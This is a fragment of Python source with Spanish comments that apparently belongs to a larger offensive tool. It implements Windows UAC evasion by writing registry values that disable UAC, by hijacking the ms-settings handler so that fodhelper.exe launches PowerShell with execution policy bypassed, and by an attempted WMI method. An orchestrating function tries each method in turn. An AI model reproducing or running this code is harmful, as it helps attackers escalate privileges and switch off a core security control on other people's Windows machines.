# ========== EVASIÓN DE UAC ==========

def verificar_token_admin() -> bool:
    """Verifica si el token actual es administrador sin UAC"""
    try:
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "[Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return resultado.returncode == 0 and resultado.stdout.strip()
    except:
        return False


def verificar_token_system() -> bool:
    """Verifica si ejecutamos como SYSTEM"""
    try:
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "[Security.Principal.WindowsIdentity]::GetCurrent().User.Value -match 'S-1-5-18'"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return resultado.returncode == 0 and "True" in resultado.stdout
    except:
        return False


def evitar_uac_via_registro():
    """Intenta deshabilitar UAC temporalmente mediante registro"""
    try:
        ruta_uac = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_uac, access=winreg.KEY_WRITE)
        
        valor_original = winreg.QueryValueEx(clave, "ConsentPromptBehaviorAdmin")[0]
        
        winreg.SetValueEx(clave, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(clave, "EnableLUA", 0, winreg.REG_DWORD, 0)
        
        winreg.CloseKey(clave)
        logger.info("[+] UAC deshabilitado via registro")
        return True
    except Exception as e:
        logger.warning(f"[!] No se pudo deshabilitar UAC: {e}")
        return False


def evitar_uac_via_fodhelper():
    """Utiliza el método FODHelper para elevar permisos sin UAC"""
    try:
        logger.info("[*] Intentando evasión de UAC via FODHelper...")
        
        ruta_com = r"Software\Classes\ms-settings\Shell\Open\command"
        
        ps_script = (
            "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
            "Write-Output '[+] Permisos elevados obtenidos'; "
        )
        
        try:
            clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_com)
            winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
                            f"powershell.exe -ExecutionPolicy Bypass -Command {ps_script}")
            winreg.SetValueEx(clave, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(clave)
            
            subprocess.Popen("fodhelper.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
            logger.info("[+] FODHelper ejecutado")
            return True
        except Exception as e:
            logger.warning(f"[!] FODHelper fallido: {e}")
            return False
            
    except Exception as e:
        logger.warning(f"[!] Error en evasión FODHelper: {e}")
        return False


def evitar_uac_via_wmi():
    """Intenta usar WMI para ejecutar procesos elevados"""
    try:
        logger.info("[*] Intentando evasión de UAC via WMI...")
        
        comando_ps = (
            "& {"
            "$objWMIService = Get-WmiObject -Class Win32_ProcessStartup; "
            "$objConfig = $objWMIService.CreateInstance(); "
            "$objConfig.ShowWindow = [System.Diagnostics.ProcessWindowStyle]::Hidden; "
            "}"
        )
        
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command", comando_ps],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if resultado.returncode == 0:
            logger.info("[+] WMI ejecutado exitosamente")
            return True
    except Exception as e:
        logger.warning(f"[!] WMI fallido: {e}")
    
    return False


def obtener_admin_sin_uac() -> bool:
    """Intenta múltiples métodos de evasión de UAC"""
    
    logger.info("=" * 70)
    logger.info("INTENTO DE EVASION DE UAC")
    logger.info("=" * 70)
    
    if verificar_token_admin():
        logger.info("[+] Ya ejecutandose con token administrativo")
        return True
    
    logger.warning("[!] Sin token administrativo, intentando evasión...")
    
    metodos = [
        ("Registro (ConsentPromptBehavior)", evitar_uac_via_registro),
        ("FODHelper", evitar_uac_via_fodhelper),
        ("WMI", evitar_uac_via_wmi),
    ]
    
    for nombre, metodo in metodos:
        try:
            logger.info(f"\n[*] Probando: {nombre}")
            if metodo():
                logger.info(f"[+] {nombre} exitoso")
                time.sleep(1)
                return True
        except Exception as e:
            logger.debug(f"[!] {nombre} fallido: {e}")
            continue
    
    logger.error("[x] Todos los métodos de evasión fallaron")
    return False


